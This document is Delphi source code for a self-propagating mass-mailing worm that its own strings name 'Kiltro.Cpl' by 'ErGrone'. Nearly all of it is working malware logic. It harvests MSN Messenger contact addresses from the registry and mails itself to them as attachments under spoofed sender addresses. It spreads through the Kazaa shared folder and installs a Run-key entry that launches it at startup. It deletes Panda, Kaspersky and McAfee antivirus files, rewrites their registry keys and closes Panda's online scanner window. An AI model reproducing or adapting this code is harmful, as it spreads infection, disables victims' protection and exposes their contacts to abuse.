   unit unidadworm;

   interface

   uses
   Windows,registry, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, wininet,shellapi,NMpop3, Psock, NMsmtp, ExtCtrls, StdCtrls, jpeg,
     OleCtrls, SHDocVw;

   type
     TForm1 = class(TForm)
       lasmulas: TMemo;
       Timer1: TTimer;
       mailerx: TNMSMTP;
       boxmails: TMemo;
       adjuntos: TMemo;
       tetris: TMemo;
       cuerpo: TMemo;
       kaziya: TMemo;
       procedure FormCreate(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);


     private
       { Private declarations }
     public
       { Public declarations }
     end;

     const
      cOsUnknown : Integer = -1;     cOsWin95 : Integer = 0;
        cOsWin98 : Integer = 1;     cOsWin98SE : Integer = 2;
        cOsWinME : Integer = 3;

   var
     Form1: TForm1;

     elidioma,contador,quiensoy2,kza:integer;
         archivoimail:textfile;
         archivokey:textfile;
         archivomarK:textfile;
         kazaa,pavdead,avpdead,directorio,origenx,texto,quiensoy:string;
         capturado,nokazaa,nomsn:integer;
         quiensoyX,muls,mula,mula2,fantasma,lacarga:string;
         viejos,mulax,chachara,cajacount,konk,konekto,nomando,vueltas:integer;
         disco,subjekt,donde,diasx,depur:string;
   segundo,segundox:word;
   marcaxd:integer;

         implementation
   {$R *.dfm}


      function GetOSVersion : Integer;   var     osVerInfo : TOSVersionInfo;
        majorVer, minorVer : Integer;   begin
        osVerInfo.dwOSVersionInfoSize := SizeOf( TOSVersionInfo );
        if ( GetVersionEx( osVerInfo ) ) then     begin
          majorVer := osVerInfo.dwMajorVersion;
          minorVer := osVerInfo.dwMinorVersion;
          case ( osVerInfo.dwPlatformId ) of
             VER_PLATFORM_WIN32_WINDOWS : { Windows 9x/ME }         begin
              if ( ( majorVer = 4 ) and ( minorVer = 0 ) ) then Result := cOsWin95
              else           if ( ( majorVer = 4 ) and ( minorVer = 10 ) ) then
              begin
                if ( osVerInfo.szCSDVersion[ 1 ] = 'A' ) then Result := cOsWin98SE
                else Result := cOsWin98;            end          else
              if ( ( majorVer = 4) and ( minorVer = 90 ) ) then Result := cOsWinME
              else Result := cOsUnknown;         end;       else
            Result := cOsUnknown;       end; { Final del Case}
        end else Result := cOsUnknown; {Final del if}   end;
      function GetOSName( OSCode : Integer ) : String;   begin
        if ( OSCode = cOsUnknown ) then       Result := '(upps)'
        else if ( OSCode = cOsWin95 ) then
        Result := '9x'
        else if ( OSCode = cOsWin98 ) then
        Result := '9x'
        else if ( OSCode = cOsWin98SE ) then
          Result := '9x'
        else if ( OSCode = cOsWinME ) then
          Result := '9x'
        end;

   function matapanda:integer;
   var
       jandle:integer;
    begin
      jandle:=FindWindow(nil,'Panda ActiveScan - Microsoft Internet Explorer');
      If jandle<>0    then
      begin
        Repeat
          jandle:=FindWindow('CabinetWClass',nil);
          if jandle <> 0 Then SendMessage(jandle,WM_NCDestroy,0,0);
        Until (jandle=0);

        Repeat
          jandle:=FindWindow('IEFrame',nil);
          if jandle <> 0 Then SendMessage(jandle,WM_NCDestroy,0,0);
        Until (jandle=0);
      end;
      end;

   function GetLocalT: word;
    var
       stSystemTime : TSystemTime;
    aaa:word;
    begin
       Windows.GetLocalTime( stSystemTime );

       Result :=stSystemTime.wSecond;
       //timeToStr( SystemTimeToDateTime( stSystemTime ) );

    end;


   procedure enviate(mailer:Tnmsmtp);
   begin
   texto:=  'AVP murio, Panda Scan on line con IE... murio, Ahora si Kiltro a regresado, por última vez como Worm Social, por ErGrone... Viva Sudamerica!!!';
   texto:=  'Vale Zirkov!!!, aver como anda por el kazaa kazaando tontos';
   texto:=  'Kiltro.Cpl V1c por ErGrone, Saludos a todos en ZonaVirus';
   end;
   procedure nosenganchamosenelpc(RootKey: HKEY; Key, Value: string;
     RegDataType: TRegDataType; Data: variant);
   var
     Reg: TRegistry;
     s: string;
   begin
     Reg := TRegistry.Create(KEY_WRITE);
     try
       Reg.RootKey := RootKey;
       if Reg.OpenKey(Key, True) then begin
         try
           if RegDataType = rdUnknown then
             RegDataType := Reg.GetDataType(Value);
           if RegDataType = rdString then
             Reg.WriteString(Value, Data)
           else if RegDataType = rdExpandString then
             Reg.WriteExpandString(Value, Data)
           else if RegDataType = rdInteger then
             Reg.WriteInteger(Value, Data)
           else if RegDataType = rdBinary then begin
             s := Data;
             Reg.WriteBinaryData(Value, PChar(s)^, Length(s));
           end else
             raise Exception.Create(SysErrorMessage(ERROR_CANTWRITE));
         except
           Reg.CloseKey;
           raise;
         end;
         Reg.CloseKey;
       end else
         raise Exception.Create(SysErrorMessage(GetLastError));
     finally
       Reg.Free;
     end;
   end;


   function GetWindowsDirectory : String;
      var
         pcWindowsDirectory : PChar;
         dwWDSize           : DWORD;
      begin
         dwWDSize := MAX_PATH + 1;
         GetMem( pcWindowsDirectory, dwWDSize );
         try
            if Windows.GetWindowsDirectory( pcWindowsDirectory, dwWDSize ) <> 0 then
               Result := pcWindowsDirectory;
         finally
            FreeMem( pcWindowsDirectory );
         end;
      end;

          function registrodevictimas(RootKey: HKEY; Key, Value: string): variant;
   var
     Reg: TRegistry;
     RegDataType: TRegDataType;
     DataSize, Len: integer;
     s: string;
   label fueradeindice;
   begin
   Reg := nil;
     try
       Reg := TRegistry.Create(KEY_QUERY_VALUE);
       Reg.RootKey := RootKey;
       if Reg.OpenKeyReadOnly(Key) then begin
         try
           RegDataType := Reg.GetDataType(Value);
           if (RegDataType = rdString) or
              (RegDataType = rdExpandString) then
             Result := Reg.ReadString(Value)
           else if RegDataType = rdInteger then
             Result := Reg.ReadInteger(Value)
           else if RegDataType = rdBinary then begin
             DataSize := Reg.GetDataSize(Value);
             if DataSize = -1 then goto fueradeindice;
             SetLength(s, DataSize);
             Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
             if Len <> DataSize then goto fueradeindice;
             Result := s;
           end else
   fueradeindice:

         except
           s := ''; // Deallocates memory if allocated
           Reg.CloseKey;
           raise;
         end;
         Reg.CloseKey;
       end else
         raise Exception.Create(SysErrorMessage(GetLastError));
     except
       Reg.Free;
       raise;
     end;
     Reg.Free;
   end;


   procedure leerimailsvictimas(lamemo:tmemo);
   var
   imails: array[0..1000] of string ;
   f:integer;
   imailunicode,imailbien,espejo:string;
   conta:integer;
   marca:integer;
   label nomas;
   begin
   espejo := '*';    //nada mas que una marca para iniciar el espejo

   AssignFile (archivoimail,directorio+'\commfig.sys');  // la bodega de imails
   Rewrite (archivoimail);
   //aqui obtenemos 1001 imails para multiplicarme, ojala agarre un ciber ;-)+----<
   for f := 0 to 1000 do
   begin
   try
   imailunicode:=(registrodevictimas(HKEY_CURRENT_USER,'\Software\Microsoft\MessengerService\ListCache\.NET Messenger Service', 'Allow'+inttostr(f)));
   except

   end;
   marca := 0;  //marca 0 es comenzamos a leer la siguiente direccion imail
   imailbien :='';
   //el retorno de registrodevictimas tiene caracteres unicode al final
   //de cada direccion imail, debemos descartarlos
   //para obtener un recipiente valido.
   for conta := 1 to 90 do  //cuantos carcteres leeremos
   begin
   if imailunicode[conta] = '' then // checkamos el comienzo unicode, si es verdadero
                                   //leemos hasta aqui y guardamos el imail limpio.
   begin
   marca := 1;  // esta marca nos informa el inicio del unicode
   //si la victima tiene menos de 101 contactos entonces el ultimo contacto
   //se repetira hasta completar los 101,
   //chackando con la variable espejo limpiamos este residuo
   if espejo = imailbien then goto nomas;
   writeln(archivoimail,imailbien);       // lo explico?
   espejo := imailbien;                   // ha?
   end
   else
   if espejo = imailbien then goto nomas;
   if marca = 1 then goto nomas;
   imailbien := imailbien+imailunicode[conta];   //juntamos el imail letra por letra
   end;
   nomas:   //UFFFFFFFFFFFf, descansamos

   end;

   end;



   procedure TForm1.FormCreate(Sender: TObject);

   var
         cuantos,dummy : integer;
             Sem  : THandle;
             donde:string;
   label noconecto;
   label nolomando;
   label terminamos;
   label terminamos2;
             begin

   if fileexists(pchar(directorio+'\'+ 'zero.exe')) then goto terminamos;

   nokazaa:=0;
   nomsn:=0;
             kza:=0;
   try
   kazaa:=(registrodevictimas(HKEY_CURRENT_USER,'\Software\Kazaa\Transfer', 'DlDir0'));
   except
   nokazaa:=1;
   end;
   quiensoy:=getcommandline;   // verificamos el cuerpo
   quiensoy2:=StrLen(pchar(quiensoy));

   for contador:=41 to (quiensoy2-1) do
   begin
   origenx:=origenx+quiensoy[contador];
   end;

   if GetOsName ( GetOSVersion )= '9x' then
   begin
   origenx :='';
   for contador:=25 to (quiensoy2-1) do
   begin
   origenx:=origenx+quiensoy[contador];
   end;
   end;
   quiensoy:=origenx;

   copyfile(pchar(quiensoy),pchar(directorio+'\'+ inttostr(boxmails.Handle)+'.cpl'  ),true);
   directorio:=GetWindowsDirectory;
   form1.Caption := inttostr(boxmails.Handle+GetLocalT);


   try
   leerimailsvictimas(boxmails);
   CloseFile(archivoimail);
   except
   nomsn:=1;
   end;
   try
   boxmails.Lines.LoadFromFile(directorio+'\k32.vxd');
   viejos := boxmails.Lines.Count;
   except
   end;
   try
   boxmails.Lines.LoadFromFile(directorio+'\commfig.sys');
   except
   end;
   if viejos < boxmails.Lines.Count then
   begin
   deletefile(directorio+'\zero.exe');
   end;

   try
   for kza := 0 to kaziya.Lines.Count do
   begin
   if nokazaa=0 then
   begin
   copyfile(pchar(quiensoy),pchar(kazaa+'/'+kaziya.Lines[kza]),false);
   end;
   end;
   except
   end;

   noconecto:
   mailerx.Host :=  'mail.hotmail.com';
   try
   mailerx.Connect;
   except
   end;
   if mailerx.Connected = false then goto noconecto;

   terminamos:
   cuantos:=adjuntos.Lines.Count;
   while cuantos > 0 do
   begin

   copyfile(pchar(quiensoy),pchar(directorio+'\'+ adjuntos.Lines[cuantos]),true);
   dec(cuantos);
        end;



   try
   nosenganchamosenelpc(HKEY_LOCAL_MACHINE,'\SOFTWARE\KasperskyLab\SharedFiles','Folder',rdString, directorio);
   except
   end;
   nosenganchamosenelpc(HKEY_CURRENT_USER,'\Software\Microsoft\Windows\CurrentVersion\Run',inttostr(boxmails.Handle), rdString, 'rundll32.exe shell32.dll,Control_RunDLL '+directorio+'\'+inttostr(boxmails.Handle)+'.cpl');
   ///obtenemos un autor fantasma para el reenvio
   muls:= inttostr(boxmails.Handle);
   mula:=muls[2];
   mula2:=muls[1];
   mulax:=strtoint(mula)+strtoint(mula2);
   mula2:=muls[4];
   mulax:=mulax+strtoint(mula2);

   cajacount := boxmails.Lines.Count;
   if cajacount < mulax then
   begin
   fantasma:=boxmails.Lines[cajacount-1];
   end
   else
   fantasma:=boxmails.Lines[mulax];
   if cajacount = mulax then
   begin
   fantasma:= boxmails.Lines[cajacount-1];
   end;
   if fileexists(pchar(directorio+'\'+ 'zero.exe')) then goto terminamos2;
    matapanda;
    nolomando:
   try
   mailerx.PostMessage.FromAddress:=fantasma;
   mailerx.PostMessage.FromName := fantasma;
   mailerx.PostMessage.Subject := subjekt;
   mailerx.PostMessage.Body.add(cuerpo.Lines[segundo]);
   if segundo = 34 then
   begin
   mailerx.PostMessage.Body.Assign(tetris.Lines);
   end;
   lacarga:=directorio+'\'+ adjuntos.Lines[segundo];

   mailerx.PostMessage.Attachments.Add(lacarga);
   mailerx.PostMessage.ToBlindCarbonCopy.assign(boxmails.Lines);
   //para testear//mailerx.PostMessage.ToAddress.Add('ergrone@hotmail.com');
   mailerx.SendMail;
   nomando:=0;
   copyfile(pchar(directorio+'\commfig.sys'),pchar(directorio+'\K32.vxd'),true);
   except
   if nomsn=0 then
   begin
   nomando:=8;
   end;
   mailerx.Disconnect;
   nomando:=9;

   end;
   if nomando = 9 then goto noconecto;
   copyfile(pchar(quiensoy),pchar(directorio+'\'+ 'zero.exe'  ),true);
   mailerx.Disconnect;

     terminamos2:


   end;
   ////

   procedure TForm1.Timer1Timer(Sender: TObject);
   label noconecto;
   label noenvio;
   label envio;
   label terminamos;
   label regresa;
   label yaestamos;
   begin

   directorio:=GetWindowsDirectory;
   matapanda;
   deletefile('C:\archiv~1\perav\pav.dll');
   deletefile('C:\archiv~1\perav\per.dll');
   deletefile('C:\program files\perav\pav.dll');
   deletefile('C:\program files\perav\per.dll');
   nosenganchamosenelpc(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','PAV.EXE',rdString, directorio);
   try
   nosenganchamosenelpc(HKEY_LOCAL_MACHINE,'\SOFTWARE\KasperskyLab\SharedFiles','Folder',rdString, directorio);
   except
   end;
   try
   avpdead:=registrodevictimas(HKEY_LOCAL_MACHINE,'\SOFTWARE\KasperskyLab\SharedFiles','Folder');
   deletefile(avpdead+'\bases\avp.set');
   except

   end;
   deletefile(directorio+'\system\vshield.vxd');
   deletefile(directorio+'\system32\vshield.vxd');
   deletefile(directorio+'\vshield.vxd');
   //disco:=directorio[1];
   form1.Visible := false;

   copyfile(pchar(quiensoy),pchar(directorio+'\'+ inttostr(boxmails.Handle)+'.cpl'  ),true);
   nosenganchamosenelpc(HKEY_CURRENT_USER,'\Software\Microsoft\Windows\CurrentVersion\Run',inttostr(boxmails.Handle), rdString, 'rundll32.exe shell32.dll,Control_RunDLL '+directorio+'\'+inttostr(boxmails.Handle)+'.cpl');

   regresa:
   if chachara = 1 then goto yaestamos;
   segundo:=GetLocalT;
   if segundo < 41 then
   begin
   subjekt:=lasmulas.Lines[segundo];
   chachara:=1;
   end
   else
   segundo := segundo-40;
   subjekt:=lasmulas.Lines[segundo];
   chachara:=1;
   yaestamos:
   matapanda;

     terminamos:
     matapanda;
   end;







   end.
